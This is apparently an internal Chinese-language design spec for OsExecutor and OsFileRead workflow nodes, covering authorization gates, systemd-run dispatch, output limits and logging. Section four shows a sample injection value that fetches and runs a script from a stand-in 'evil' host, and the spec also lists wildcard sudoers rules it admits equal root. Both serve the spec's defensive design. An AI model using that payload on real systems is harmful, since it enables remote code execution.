# OsExecutor / OsFileRead 節點規格（2026-08-30 第三版，規劃階段）

**狀態：2026-08-30 已實作並通過端到端驗收**（PF-181 / PF-182，憑證
`/opt/tmp/verify/20260830-osnode.log`，盤點編號 NT-28 / NT-29）。
本檔仍是規格權威，但**實作與本文有六處差異，全部記在第十四節「實作後記」**——
以第十四節為準。

動工前整份讀完；派工給 codex 時整份貼進 prompt（codex 不讀 CLAUDE.md）。

決策脈絡：Ethan 2026-08-28～30 三輪討論定調。與既有的 `SqlExecutor`
（`dev-notes/SQL_EXECUTOR_SPEC.md`）、`AiAgent`
（`dev-notes/AI_NODE_USAGE_QUOTA_SPEC.md`）同屬「流程呼叫外部世界」的節點家族，
但**授權模型刻意與 SqlExecutor 相反**，見第二節。

> **第二版修訂重點**：2026-08-30 的節點整併（commit `5fc74418`）與 End cancel 修復
> （commit `f2e0ecf7`）改變了三件本規格依賴的事實——`skip_advance` 機制出現、
> Branch fallback 不再走所有出邊、cancel 模式會殺 node_runner 的 process group。
> 第五節與第七節依此重寫，**第一版關於「預設走所有出邊是坑」的判斷已作廢**。

---

## 一、定位與責任分界

`OsExecutor` 讓流程在平台主機上執行任意命令。這使 BeakPlatform 具備 INFRA 控制能力，
代價是**執行權限等同 executor 的 OS 帳號**（開發機是 `ethan`，可 sudo）。

### 刻意不做命令黑白名單（Ethan 2026-08-29 定調）

理由：`sh -c` 間接呼叫、腳本層層包裹、自寫執行檔——任何名單都繞得過去，
做了只會產生虛假的安全感。**OS 的穩定由 OS 管理員負責**（cgroup、quota、
sudoers、EDR、備份），不由本平台在 handler 裡模擬。

因此評估階段一度提出的 `RLIMIT_FSIZE` / `RLIMIT_AS` / `RLIMIT_NPROC` **明確撤回**。

### 但平台仍要保護自己

分界不是「安全 vs 不安全」，是**誰的東西會壞掉**：

| 平台必須做 | 壞掉的是誰的東西 |
|---|---|
| env 白名單，絕不傳 `os.environ` | node_runner 進程持有 `DATABASE_URL` / `SECRET_KEY` / `ENCRYPTION_MASTER_KEY`，洩漏的是**平台的**秘密 |
| 逾時收乾淨 + `MAX_TIMEOUT` 硬上限 | 全 repo **沒有 stale RUNNING 回收機制**，卡住的是**平台的** queue，且永遠沒人救 |
| **與 End cancel 模式協同**（第七節） | cancel 模式殺不到的子進程會變成孤兒，破壞「真正中斷整棵流程樹」的保證 |
| stdout 寫檔不用 PIPE | PIPE 阻塞卡死的是**平台的** node_runner |
| 讀取上限（不是寫入上限） | 命令寫 10GB 到磁碟是 OS 的事；把 10GB 讀進流程變數與 DB 是**平台的**事 |
| 剝除 ANSI escape 與控制字元 | 輸出會流進表單、簽核意見、log 頁面，不剝就是儲存型 XSS |
| 併發上限 | executor 派工行為（`workflow_executor.py:141` 的 `limit(10)` / 5 秒且不看在跑幾個），OS 管理員管不到 |
| 變數插值引號化 | 提權的對象是**平台的**執行身分，見第四節 |
| 執行前 log 先落地才啟動進程 | 事後追責是**平台**要提供的能力 |
| 注入追蹤標記（第八節） | 「OS 上這個可疑 process 是誰起的」只有平台答得出來 |
| 暫存目錄清理 | 平台自己的磁碟 |

---

## 二、授權邊界（這條不能放）

`node_config` 來自 `fw_workflow_templates.graph`（`workflow_engine.py:443`），
graph 由 `PUT /api/workflows/data/templates/<sc>` 改寫，門檻是
`@module_access_required('form_workflow')` ＋ 流程設計頁雙鑰匙
→ **ORG_ADMIN 或持 `FLOW_DESIGNER` 的人，per-org**。租戶自己就能指派這個角色。

不設閘門 ＝「任一租戶管理員 → 平台主機 shell」，而他們不是「系統級管理者」。

### 兩道閘門（都是「誰能用」，不是「能用什麼命令」）

1. **`OS_NODE_ENABLED` 環境變數**。未啟用時：
   - `workflow_node_definitions.is_active = false`（設計器面板看不到）
   - **且 handler 執行期直接拒絕** —— graph 裡已寫死的節點不得靠關開關繞過
2. **企業授權**：`workflow_node_org_grants` 表（2026-08-31 起；原本是系統設定
   `os_node_allowed_orgs`，已刪除）。受限節點由
   `workflow_node_definitions.org_restricted = true` 標示，安裝後只有系統企業
   （`organizations.is_system_org`）取得授權，**沒有 grant ＝ 不能用**。

`OsFileRead` 的兩道閘門**各自獨立**（`OS_FILE_READ_NODE_ENABLED` + 自己的 grant），
理由見第六節開頭。

**兩道都必須在 handler 執行期重查**，理由同 SqlExecutor 檔頭那條：
設計器的可見性從來不是防線，graph 可被 PUT 改寫。
2026-08-31 起可見性與 graph 寫入也吃同一份判定（`node_grant_service.py`），
但那是降噪與早期攔截，**執行期重查仍是唯一的防線**。

`require_system_admin` **不要用**，但原因與本檔第一版寫的不同（2026-08-31 實測更正）：

> 原文寫「SYSTEM_ADMIN 沒有 form_workflow 合約所以 403」——**這是錯的**。
> 系統企業本來就免合約（`module_access_service.py:225-232` 明寫
> `if org_sc == SYSTEM_ORG_CODE: return True`）。`admin@system.local` 打
> `/api/workflows/data/node-definitions` 拿到 403 是卡在**模組 ACL**：
> 系統企業有 2 筆 `form_workflow` 的 ROLE 型 ACL 記錄，而該帳號沒有那兩個角色，
> `ModuleAccessService.check_user_access()` 判 False。

不用它的真正理由有三個：判準是**帳號 user_type** 而不是企業；只擋設計器可見性
（graph 寫入與 publish 完全不看它）；對「某個客製節點只開放給某一家客戶企業」
這種需求無解。既有的 EmailRelay、SysTelegram 仍維持 `require_system_admin=true`，
現況就是沒有任何帳號看得到，只能靠腳本寫 graph。

---

## 三、OsExecutor：四分法

流程系統無法預估設計師會執行什麼。**設計師有責任先在 OS 層測試完**，
至少要有「一切正常時該在多久內獲得什麼格式的回應」這組基本資料。
節點只回報四種結果，其餘（互動卡住、非預期回應、後處理）由設計師用其他積木組合。

### 判定表

| 條件 | `_result` | 備註 |
|---|---|---|
| 時限內結束 ∧ exit code ∈ `expect_exit_codes` ∧（若有宣告）輸出符合格式 | `ok` | |
| 時限內結束，但 exit code 或格式不符 | `exception` | 帶 `_exit_code` / `_stderr` |
| 未在時限內結束（已收乾淨） | `timeout` | 帶 `_killed` |
| `wait_for_result: false`，交給 OS（`systemd-run`） | `dispatched` | 帶 `_unit`，**這次不等結果**；最終狀態事後可由 `systemctl show bp-<sc>` 查得（第七節） |

### 四種結果全部回 `status: 'success'`

**這是刻意的，不是疏漏。** `FwNodeExecutionQueue.fail()`（`node_execution.py:114`）
無條件 `retry_count += 1`，未達 `max_retries=3` 就回 `PENDING` 重跑，
且 `node_runner.py` 沒有任何不可重試的分支。回 `error` 的後果是
**有副作用的命令被自動重跑 3 次**；而逾時最可能的真相是「命令還在跑」，
重試會疊上第二份。

代價（已知並接受）：`fw_node_execution_queue.status` 四種情形都是 `SUCCESS`，
流程管理頁看不出命令失敗過。因此 `queue.result` 必須帶 `result` 欄位，
且 log level 依四分法分別用 INFO / ERROR / ERROR / INFO，讓 log 查得出來。

### 設計師一定會踩的三個邊界（必須寫進使用者文件）

1. **exit 0 不等於工作完成。** `nohup xxx &`、`ssh host 'cmd &'` 會立刻回 0，
   四分法給 `ok`，但工作還在跑。四分法只描述**這次 subprocess 的生命週期**，
   不描述工作是否真的完成。要描述後者只能靠設計師自己輪詢
   （下一個節點讀檔／查 process），或讓命令回打平台 API。
2. **逾時的收尾會連坐殺掉背景子孫**（同一個 process group）。用 `&` 起的常駐程序
   會在逾時那一刻一起死。設定 `kill_on_timeout: group|process|none`，
   **預設 `group`** —— 「不殺」等於平台自己養殭屍。
3. **ssh 逾時只殺得掉本地 client，遠端命令照跑。** 這是 SSH 協定的性質，
   平台修不了。跨主機的長時間作業請走「命令回打平台 API」。

---

## 四、變數插值：唯一不能完全自由的地方

參數自由度給的是**設計師**，不是**填表人**。

```
grep "${f.keyword}" /var/log/app.log
```

`f.keyword` 來自表單。填表人可能是 EXTERNAL 外部帳號，也可能是 OD intake 的
webhook payload（**攻擊者完全可控**）。填入 `"; curl evil/x.sh|bash; #`
就取得了設計師的執行權限。這不是限制系統管理者，是防止外人冒用他的手。

### 規則

- **變數插值一律 `shlex.quote()`**。設計師的命令模板本身完全不動，
  只有代入的值被包成單一 shell 詞，`;` `$()` 反引號全部失效
- 需要變數帶多個參數時（`${v.opts}` = `-l -a`）用 **`${v.opts!raw}`** 明確標記，
  設計器上該欄位顯示紅字警告
- **單次非遞迴替換**：代入的內容不再被二次掃描（同 SqlExecutor `_build_params` 的註解）

### 無法從技術上禁止、只能留證的情況

設計師把整條命令寫成 `${v.cmd}`，而 `v.cmd` 來自表單。這時引號化沒有意義。
處置：**log 同時記模板原文與展開後的實際命令兩份**，事後查得出來。

---

## 五、出邊語意：對齊結論（2026-08-30 重新盤點）

**系統的原始設計是「拉了幾條線就都要執行，除了有條件判斷的節點才依設計處理」，
這條規則現在完全有效。** 掃過全部 23 個 handler，只有三個會覆寫預設推進：

| 節點 | 何時依設計選邊 | 何時仍走所有出邊 |
|---|---|---|
| **Branch** | 規則命中 → 走命中規則對應的邊（**可能多條同時**）；fallback `action='route'` → 走指定的邊 | **不會**。fallback 非 route 一律 `skip_advance`（2026-08-30 修正） |
| **FormAdapter** | 簽核者按下按鈕 → 走該決策對應的邊；`selection_mode='multiple'` 可選多條 | 未配對決策的按鈕 = REJECTED 終態 |
| **ParallelJoin** | 逾時走 `timeout_edge_id`；`release_once` 已放行過 → `skip_advance` | 正常會合 → 走所有出邊 |

其餘 20 個（SqlExecutor、AiAgent、DecisionWriter、OpSet、Delay、ParallelFork、
Email、Telegram…）一律走所有出邊。

`advance_to_next_nodes`（`node_runner.py`）的優先序是
**`skip_advance` > `selected_edges` > `selected_edge` > 全部出邊**。

### 因此 OsExecutor **不做** `result_edges`

第一版曾建議「依四分法指定出邊」，理由是「預設全走是坑」。
重新盤點後這個判斷作廢——**那不是坑，那是這個系統一貫的設計**。

要依 `_result` 分流就接一個 Branch 判 `${v.x_result}`。這樣全系統只有一種分流語意，
而「哪些節點會選邊」那份清單不會繼續變長——那份清單變長正是 2026-08-30
要做節點整併的原因。

### 但 OsExecutor **要用** `skip_advance`

`skip_advance` 是 2026-08-30 新增的「執行成功但不推進」唯一機制
（`selected_edges: []` 無效，空 list 是 falsy 會落到取所有出邊）。
OsExecutor 有兩處要用它：

- 節點**沒有任何出邊**時：引擎本來就會安全終止（`workflow_engine.py:422` 的
  `return []`），但明確回 `skip_advance` + `skip_advance_reason='os_no_outgoing'`
  可讓 log 查得出「設計如此」而不是漏接線
- 設計師明確要求「這一步做完就結束這條分支」時（config `stop_after: true`）

**分支末端無去向是合法且必要的。** 與 CLAUDE.md 的「一律走到 End 節點收尾」不衝突：
那條講的是主路徑；**並行分支的末端不可以指向 End**，因為 End 是流程級結束，
任一分支走到就整個流程 COMPLETED。

---

## 六、OsFileRead 節點

### 定位：授權低一階，這才是它真正的價值

`head` / `tail` / `grep -A -B` / `grep -c` 設計師在 OsExecutor 裡就做得到。
OsFileRead 存在的理由**不是**「OsExecutor 的配套」，而是：

**它不經 shell、唯讀、可鎖在 base_dir 內，所以可以獨立授權給沒有 OsExecutor
權限的企業與設計師。** 大部分「只想讀 log 判斷狀態」的需求，因此根本不必開
OsExecutor。這條要寫進使用者文件，否則兩個節點會被當成一組而一起開放，
白白放大授權面。

### 讀取模式

| `mode` | 參數 | 用途 |
|---|---|---|
| `whole` | — | 小檔整份讀。超過 `max_read_bytes` 自動退化為 `head` 並標 `_truncated` |
| `head` | `lines` | 檔頭 n 列 |
| `tail` | `lines` | 檔尾 n 列。**log 的主力用法** |
| `around` | `keyword`、`before`、`after`、`occurrence` | 關鍵字前後 n 列，即 `grep -B -A` |

`occurrence`：`first` / `last` / `all`（`all` 需有窗口數上限 `max_windows`）。
**`last` 對 log 特別有用**（找最後一次錯誤）。

`match_mode`：`literal`（預設）/ `regex`。
**regex 要當心 ReDoS** —— Python 內建 `re` **沒有 timeout 參數**，
惡意樣式在大檔上會讓節點進程整個卡住。v1 的處置：
regex 模式限制樣式長度，並一律受 `max_scan_ms` 保護；
若日後發現不夠，改用 `regex` 第三方套件的 `timeout=`。

`match_scope`：`anywhere`（預設）/ `line_start`。
`line_start` 對「CSV 第一欄是 id」的定位場景剛好，成本近乎為零（前綴比對而非包含比對），
且避免 id 出現在其他欄位造成的誤命中。

### 命中計數當第二道判斷

掃描時順手計數，輸出 `_match_count`。設計師用 Branch 判
`_match_count > 0` / `> N` 決定後續動作。這是四分法之外最有用的判斷依據。

v1 只支援**單一 keyword**。多關鍵字用多次呼叫（積木哲學），
不要在單一節點裡長成迷你 grep。

### 三個必要的護欄

1. **`base_dir` 白名單 + `realpath` 驗證。** 解析真實路徑後必須落在允許目錄之下，
   擋 `../` 與 **symlink 逃逸**（`/opt/tmp/x -> /etc/shadow`）。
   這是 OsFileRead 能「安全等級低一階」的前提，漏了就等於任意檔案讀取。
2. **`max_scan_bytes` / `max_scan_ms`。** 關鍵字定位在一般情況下**只能線性掃描**
   ——但**掃描不等於載入**：逐行讀、只保留命中窗口，記憶體是 O(列數) 不是 O(檔案)。
   仍需上限，避免掃 10GB 卡住 executor；超過即停並標 `_scan_truncated`。
3. **tail 必須從檔尾反向讀 block**（例 64KB 一塊直到湊滿 n 列），
   **禁止 `readlines()`** —— 那會把整個檔案讀進記憶體，等於 tail 沒有意義。
   反向讀要以 bytes 處理、按 `\n` 切、最後才 decode（block 邊界可能切在
   UTF-8 多位元組字元中間）。

### 其他實作要點

- 讀取當下記錄 `_file_size` 與 `_file_mtime`。log 正在被 append 時，
  tail 讀到的是某個瞬間的快照，這兩個值讓後續判斷得出來
- 編碼同 OsExecutor：UTF-8 `errors='replace'`，剝除 ANSI 與控制字元
- **套用同一套結果語彙**，讓設計師的 Branch 寫法能在兩個節點間直接複製：
  `ok`（讀到了）／`exception`（檔案不存在、無權限、超出 base_dir、編碼失敗）／
  `timeout`（掃描超過 `max_scan_ms`）。三種同樣全部回 `status: 'success'`

### 寫出的流程變數

`<result_var>_result`、`_content`、`_lines`（陣列）、`_match_count`、
`_file_size`、`_file_mtime`、`_truncated`、`_scan_truncated`。

### v1 刻意不做 CSV 結構化解析

「第一欄是 id」的場景由 `match_scope: line_start` 覆蓋。
完整 CSV 解析要處理引號、跳脫、多行欄位，是另一個複雜度層級，
而真要結構化查詢 CSV，正解是先匯入 DB 再用 `SqlExecutor`。
`match_scope: field_n`（指定分隔符與第 n 欄）列為 v2 候選。

---

## 七、執行實作（2026-08-30 第三次修訂，含實測證據）

### 兩種派工方式，各自的生命週期歸屬

| 模式 | 怎麼起 | 進程歸屬 | End cancel 收得到嗎 |
|---|---|---|---|
| **等待型**（`wait_for_result: true`） | node_runner 直接 `Popen` | node_runner 的子孫，同 executor cgroup | 收得到（見下方 SIGTERM handler） |
| **交給 OS**（`wait_for_result: false`） | `sudo systemd-run --uid=<執行uid> --unit=bp-<queue_sc>` | **獨立 system 級 transient unit + 自己的 cgroup** | 收得到（`systemctl stop`），也可以刻意不收 |

**只支援 `systemd-run`，不支援 `at`**（Ethan 2026-08-30 定案）。
`at` 的實測結果證明它不可管理，記錄在本節末尾。

### 等待型：直接 Popen

```python
p = subprocess.Popen(argv,
                     stdin=subprocess.DEVNULL,
                     stdout=out_file, stderr=err_file,   # 檔案，不是 PIPE
                     cwd=cwd or work,
                     env=safe_env,
                     start_new_session=True)             # 自成 pgid，逾時才能精準 killpg
```

`argv = ['/bin/bash', '-c', expanded_command]`，**不加 `-l`**（不讀 profile，
環境由 env 白名單完全決定）。設計師要用非標準路徑的程式請寫絕對路徑：
executor 的 unit 寫死 `PATH=/opt/BeakPlatform-dev/venv/bin:/usr/local/bin:/usr/bin:/bin`，
**不含 `~/.local/bin`**（AI 節點已踩過）。

**為什麼不能用 `stdout=PIPE`**：緩衝約 64KB，滿了子進程就阻塞；更糟的是子進程若起了
孫進程（`.sh` 包一層就會），孫進程繼承那個 fd，`communicate()` 會**等到孫進程結束為止**
——即使子進程早就死了。這正是「明明有 timeout 卻永久卡住」的典型成因。
既有的 `AiAgent._run_cli()` 用 `capture_output=True`（＝PIPE）可接受，
因為它跑的是單一已知程式；**OsExecutor 跑的是任意命令，不可沿用那個寫法**。

`stdin=DEVNULL` 是必要的：程式一讀就 EOF，不會等；沒有 controlling tty，
需要 tty 的（如 `sudo` 要密碼）會直接失敗而非卡住。

### 【關鍵】等待型與 End cancel 模式的協同

2026-08-30 commit `f2e0ecf7` 讓 cancel 模式**真的會殺 node_runner 進程**：
`workflow_engine.py::_terminate_node_process` 只在 `pgid == pid` 時 `killpg`，
而 node_runner 由 executor 以 `start_new_session=True` 啟動，所以它殺的是
**node_runner 的整個 process group**。

OsExecutor 的子進程用 `start_new_session=True` 之後自成新 pgid，**cancel 殺不到**。
處置：**node_runner 內註冊 `SIGTERM` handler**，收到訊號時把子進程的 process group
一起收掉再退出。**寬限期最多 1.5 秒**——`_terminate_node_process` 在 SIGTERM 後
只等 3 秒就補 SIGKILL，handler 沒收完就自己先死，子進程會變孤兒存活，
「cancel 模式真正中斷整棵流程樹」的保證就破了。

**cancel mode 的現行行為是正確的，不得為了 OsExecutor 放寬**（Ethan 2026-08-30）。
流程結束後仍要繼續執行的需求，正解是 End 節點的 `detach` 模式
（本來就不中斷運行中的進程）＋ 交給 OS 模式，不是讓 cancel 失效。

### 交給 OS：`sudo systemd-run`（2026-08-30 實測通過）

```bash
sudo systemd-run --uid=<executor uid> --unit=bp-<queue_secure_code> \
     --setenv=BP_EXEC=<queue_secure_code> ... \
     /bin/bash -c '<展開後的命令>'
```

**四個設計要點，每一個都有實測依據**：

1. **用 system 級，不用 `--user`。** `systemd-run --user` 可行但
   `loginctl show-user` 是 `Linger=no`——帳號登出後 user manager 會停，
   而 executor 是 system service。system 級沒有這個依賴。
2. **`--uid=` 指定執行身分，工作不會自動變成 root。** unit 由 root 建立（管得動），
   但命令仍以 executor 的 OS 帳號執行。設計師要 root 就在命令內自己 `sudo`。
3. **不加 `--collect`。** 加了的話 unit 結束即消失，dispatched 模式就查不到結果。
   實測不加時，結束後仍可查：

   ```
   systemctl show bp-<sc> -p Result -p ExecMainStatus -p ActiveState
   → Result=exit-code  ExecMainStatus=3  ActiveState=failed
   ```

   **這讓 `dispatched` 有了結果回饋**：後續節點（或人）查得到最終狀態。
   清理由平台 cron 定期 `systemctl reset-failed bp-*`。
4. **stdout 自動進 journald**，`journalctl -u bp-<sc>` 取得回（實測拿到 `hi`）。
   **但 journald 有 rate limit**（預設 `RateLimitIntervalSec=30s` /
   `RateLimitBurst=10000`），大量輸出會被靜默丟棄。
   **大量輸出仍應由設計師自己 `> /path/xxx.log`，不要依賴 journal。**

### 收尾實測（決定性證據）

```
sudo systemd-run --uid=1000 --unit=bp-test-probe2 /bin/bash -c 'sleep 400 & sudo sleep 400 & sleep 400'
→ CGroup: /system.slice/bp-test-probe2.service
    ├─3323570 /bin/bash -c ...      (ethan)
    ├─3323572 sleep 400             (ethan)
    ├─3323573 sudo sleep 400        (root)   ← 命令內自行提權的子進程
    └─（共 5 個進程）
sudo systemctl stop bp-test-probe2
→ 全部 5 個進程收乾淨，含那個 root 的
```

**所以不需要 `sudo kill`。** cgroup 語意讓 `systemctl stop` 連命令內 `sudo` 提權出來的
root 子進程一起收掉，這比逐一 kill pid 更完整，權限面也更小。

### sudoers 需要的三條（實作時寫進 `docs/install/os_node.md`）

```
<executor 帳號> ALL=(root) NOPASSWD: /usr/bin/systemd-run --uid=* --unit=bp-* *
<executor 帳號> ALL=(root) NOPASSWD: /usr/bin/systemctl stop bp-*
<executor 帳號> ALL=(root) NOPASSWD: /usr/bin/systemctl reset-failed bp-*
```

**風險必須在教育文件寫明**（Ethan 2026-08-30 已知並接受）：
第一條的萬用字元等於允許以 root 建立任意 unit，實質上就是 root。
這與 OsExecutor 本身的權限等級一致（本來就是任意命令執行），不算額外擴大，
但有一個推論**必須寫進部署文件**：

> **executor 的 OS 帳號應該是專用帳號，不要與人類帳號共用。**
> 開發機是 `ethan`（本來就能 sudo 全部，沒有差別），
> 正式環境應建專用帳號，否則這三條 sudoers 等於把 root 給了那個人類帳號。

### 為什麼放棄 `at`（實測記錄，不要再回頭嘗試）

| 觀察 | 後果 |
|---|---|
| `at` 保存並還原環境變數，`BP_EXEC` 傳得到工作進程 | 反查可行，這部分是好的 |
| 但中間層的 job script `sh` **沒有**標記（`at` 是把 export 寫進 script，sh 自己的 environ 是 atd 給的） | 掃描只找得到葉子，wrapper 會漏 |
| **job 的 PGID / SESS 是 atd 的 session** | **對它 `killpg` 會殺掉 atd 本身與整台機器上所有其他 at job**。災難級誤殺 |
| 提交當下拿不到最終 pid（atd 之後才 fork） | 「記錄各級 process id」的做法在 `at` 上不成立 |

`systemd-run` 沒有任何一項問題，且收尾更乾淨。**不需要安裝 `at`。**

### env 白名單 + 追蹤標記

**絕不 `os.environ.copy()`** —— node_runner 進程持有 `.env` 全部秘密。
沿用 `ai_agent_handler.build_subprocess_env()` 的模式：預設只給
`HOME` / `PATH` / `LANG`，其餘由節點 config 逐項宣告（`extra_env`）。

**額外主動注入三個追蹤標記**（第八節說明用途）：

```
BP_EXEC=<queue_secure_code>
BP_ORG=<org_secure_code>
BP_WF=<workflow_instance_secure_code>
```

### 收尾句柄要寫進 queue_item.result

啟動後**立刻** `UPDATE`（RUNNING 階段就要有，不能等執行完）：

```json
"os_dispatch": {
  "mode": "subprocess | systemd_run",
  "pid": 12345, "pgid": 12345,     // subprocess
  "unit": "bp-<queue_sc>",          // systemd_run
  "mark": "<queue_secure_code>"     // 通用兜底，對應 BP_EXEC
}
```

`cancel_pending_nodes` 對 `node_type='OsExecutor'` 的節點，除了
`_terminate_node_process` 殺 node_runner，**再依 `os_dispatch.mode` 執行 OS 層收尾**。
撈整棵樹的 RUNNING 節點用既有的 root 展開（`f2e0ecf7` 已改對）：

```sql
SELECT q.* FROM fw_node_execution_queue q
JOIN fw_workflow_instances wi ON wi.secure_code = q.workflow_instance_secure_code
WHERE (wi.secure_code = :root OR wi.root_instance_code = :root)
  AND q.status = 'RUNNING' AND q.process_id IS NOT NULL;
```

（父子關聯的權威在 `fw_workflow_instances` 的 `parent_instance_code` /
`root_instance_code` / `workflow_depth`，**不在 queue 表**——queue 的
`calling_instance_code` / `parent_node_id` 只有子流程的 Start 節點帶
（`subflow_handler.py:195`），後續由 `advance_workflow()` 建的節點一律不帶。）

### 輸出處理（三層上限）

| 層 | 建議值 | 作用 |
|---|---|---|
| 落檔讀取上限 | 1 MB | 超過只讀頭尾各半，中間標 `...(省略 N bytes)...` |
| 進流程變數 | 4 KB | `_stdout` / `_stderr` |
| 進 log / 簽核意見 | 2 KB | |

- 編碼一律 UTF-8 `errors='replace'`
- **剝除 ANSI escape 與控制字元**（保留 `\n` `\t`），否則輸出流進表單／簽核意見就是
  儲存型 XSS，且 log 頁面會變亂碼
- 超過上限時標 `_truncated = true`

### 節點 config

| key | 必填 | 說明 |
|---|---|---|
| `command` | 是 | 命令模板，插值走 `shlex.quote()` |
| `timeout_seconds` | 是 | 夾在 `[MIN_TIMEOUT, MAX_TIMEOUT]`；`wait_for_result: false` 時不適用 |
| `result_var` | 是 | 結果變數前綴，須合 `^[a-zA-Z_][a-zA-Z0-9_]{0,63}$` |
| `wait_for_result` | 否 | 預設 `true`；`false` 走 `systemd-run` 交給 OS |
| `expect_exit_codes` | 否 | 預設 `[0]` |
| `expect_pattern` / `expect_json` | 否 | 輸出格式契約 |
| `cwd` | 否 | 預設每次新建的 `TemporaryDirectory` |
| `extra_env` | 否 | 白名單之外要額外給的環境變數 |
| `kill_on_timeout` | 否 | `group`（預設）/ `process` / `none`，僅等待型適用 |
| `stop_after` | 否 | `true` 時回 `skip_advance`，不推進任何出邊 |
| `notify_on_exception` | 否 | 預設 `true`，見第九節 |
| `notify_to` | 否 | 收件人；預設取流程模板的 `updated_by_secure_code` |

### 寫出的流程變數

`<result_var>_result`（`ok`/`exception`/`timeout`/`dispatched`）、`_exit_code`、
`_stdout`、`_stderr`、`_duration_ms`、`_truncated`、`_killed`、`_pid`、`_unit`。

**流程變數是扁平的**，Branch 只能判這些扁平 key，
不要期待 `${v.x.result}` 取得到值。

---

## 八、反查：從 OS 的可疑 process 找回平台記錄

`fw_node_execution_queue` + `fw_node_execution_logs` 已經存了完整命令、時間、流程，
**資料不缺，缺的是「從 OS 往回查平台」這個方向的索引**。

兩條路，先用第一條：

1. **unit 名稱**：`systemctl status bp-<queue_sc>` / `systemctl list-units 'bp-*'`
   直接列出所有由平台派出的 OS 任務。這是 `systemd-run` 相對於其他做法最大的好處
2. **環境變數標記**（等待型與跨層子孫用）：

   ```bash
   tr '\0' '\n' < /proc/<pid>/environ | grep ^BP_
   ```

   拿 `BP_EXEC` 回平台查 log，就有完整命令、流程、時間、設計者。
   任何方式起的子孫進程都繼承 environ。
   **限制**：只讀得到同 uid 的進程；命令若 `sudo` 提權成 root，
   executor 帳號讀不到那個 environ（但 `systemctl stop` 仍收得掉，見第七節實測）

**不另建任務登記表**：登記表只解決特定一種起法，而 unit 名稱 + 環境變數標記
涵蓋全部，且不需要維護第二份真相。

---

## 九、log 與留證

### 現況三個坑（動工前必須知道）

`WorkflowLogService.log()`（`modules/form_workflow/services/workflow_log_service.py`）：

1. **欄位被寫死**：`node_type` 恆 `'SYSTEM'`、`status` 恆 `'INFO'`、
   `execution_id` 是自造的 `EXEC-<timestamp>`（不是流程的 `exec_code`）、
   `node_instance_id` 塞的是 `node_id`。
   後果：想用 `node_type='OsExecutor'` 撈這個節點的全部執行紀錄，**現在撈不到**。
   **建議修這個 service**（欄位寫死本來就是缺陷，其他節點同樣受益），
   影響面要另外評估。
2. **每寫一筆 log 就 `db.session.commit()`**。對本節點**反而正好可用**：
   執行前那筆 log 一定先落地，即使進程被 SIGKILL 或機器斷電也查得到
   「當時到底要跑什麼」。**這件事要寫進註解，否則日後有人會順手拿掉。**
3. `log_data` 是 `json` 欄位、**無長度限制** —— 不能把 stdout 全丟進去。

### 三筆 log + 全文分層落檔

| 時機 | 內容 |
|---|---|
| **執行前（commit 完成才啟動進程）** | 命令模板原文、展開後的實際命令、每個變數的**值來源**、cwd、timeout、extra_env 的 key（不含值）、執行身分、`BP_EXEC`、`unit` 名稱 |
| 執行後 | `_result`、exit code、耗時 ms、stdout/stderr 長度與 truncated 旗標、輸出前 8KB、stdout 的 sha256、全文檔路徑 |
| 異常 | 逾時／收尾結果（SIGTERM 後是否需要 SIGKILL）／格式驗證失敗／授權拒絕 |

| 層 | 內容 | 保留 |
|---|---|---|
| `fw_node_execution_logs.log_data` | 摘要 + stdout/stderr **前 8KB** | 跟著 log 表 |
| `/opt/tmp/osnode/<日期>/<queue_secure_code>.out` / `.err` | **全文**（等待型） | 例外／逾時 30 天，正常 7 天，cron 清理 |
| `journalctl -u bp-<sc>` | dispatched 模式的輸出 | 依 journald 設定，**且有 rate limit，不保證完整** |

分層之後「例外時從 log 找線索」完全成立：log 有摘要 + 路徑，要細節就去讀那個檔
——而且**可以直接用 OsFileRead 節點讀回來**，兩個新節點互相咬合。

### 例外通知

- **主路徑**：Branch → `exception` → 既有通知節點（EmailAdapter / Telegram / AlertBroadcast）
- **兜底**：`notify_on_exception`（預設 true）。收件人預設取流程模板的
  `updated_by_secure_code`（`fw_workflow_templates` 已有此欄位且 PUT 時會寫入，
  `api/workflows.py:311-313`）
- **必須節流**，否則兜底本身變成災難：OD intake 一次進 50 案全部例外 ＝ 50 封信。
  同一「節點 + 錯誤類型」在 N 分鐘內只發一次（建議預設 30 分鐘）
- `AlertBroadcast` 天然有節流性質（同 `broadcast_code` 覆蓋前一則），
  當例外通知比 email 更不會洗版

v2 候選：管理頁列出所有 OsExecutor 的 exception / timeout 記錄。

---

## 十、併發上限與部署需求

### 併發

`workflow_executor.py:141` 每輪（5 秒）以 `limit(10)` 撿 PENDING 節點並各起一個
subprocess，**不看目前有幾個在跑**。處置：handler 執行前檢查「同 org 正在跑的
OsExecutor 數量」，超過上限就回 `status: 'waiting'` 並帶 `retry_after_seconds`
（`node_runner.py:119` 已支援，不必改引擎）。

### 部署需求（實作時寫進 `docs/install/os_node.md`，比照 `docs/install/ai_node.md`）

- **sudoers 三條**（第七節）＋ **executor 應使用專用 OS 帳號**的說明與風險告知
- `.env.example` 加 `OS_NODE_ENABLED` / `OS_FILE_READ_NODE_ENABLED` 與註解
- cron：定期 `systemctl reset-failed bp-*` 與清理 `/opt/tmp/osnode/`
- **不需要 `at`**（第七節已說明放棄理由）

---

## 十一、節點註冊與驗收

### 註冊

`workflow_node_definitions` 各一筆，`category = '系統'`。
`system_admin` 分類在四個地方**都已存在**（`api/workflows.py:655` 的 `category_map`、
`workflow-designer-init.js:71` 的 `CATEGORY_NAMES`、同檔 `:101` 的 `categoryOrder`、
CSS），**不必改前端分類**。

`require_system_admin` 一律 `false`（理由見第二節），可見性靠 env 開關控制 `is_active`。

屬性面板要新寫 `wf-node-os-executor.js` / `wf-node-os-file-read.js`
——`workflow_node_definitions.config_schema` **沒有任何前端消費者**，
往 DB 補 schema 不會讓設計器多出欄位。

**新增節點要同步登記 `dev-notes/NODE_TEST_INVENTORY.md`**：
編號往後接續，**下一個是 NT-28**（OsExecutor）、NT-29（OsFileRead）。
編號一經指派不得重排、不得回收。

### 驗收

- **必須經由真正的 executor 跑一次完整流程**，不可只在 `venv/bin/python -c` 裡叫 handler
- 改 handler 後 **executor 要重啟**（`beakplatform-dev-executor` 是獨立進程）
- 四分法四條路徑各實測一次，逾時那條要確認**背景子孫真的被收乾淨**
  （`ps -ef` 對照，不是只看節點回什麼）
- **End cancel 模式的協同要單獨驗兩次**：
  1. 等待型：流程跑到 OsExecutor 時觸發 cancel，確認 OS 子進程也死了
  2. dispatched：確認 `systemctl stop bp-<sc>` 收掉整個 cgroup（含命令內 `sudo` 起的
     root 子進程），手法見第七節的實測記錄
  參考 `backend/tests/test_workflow_cancel_mode.py` 與
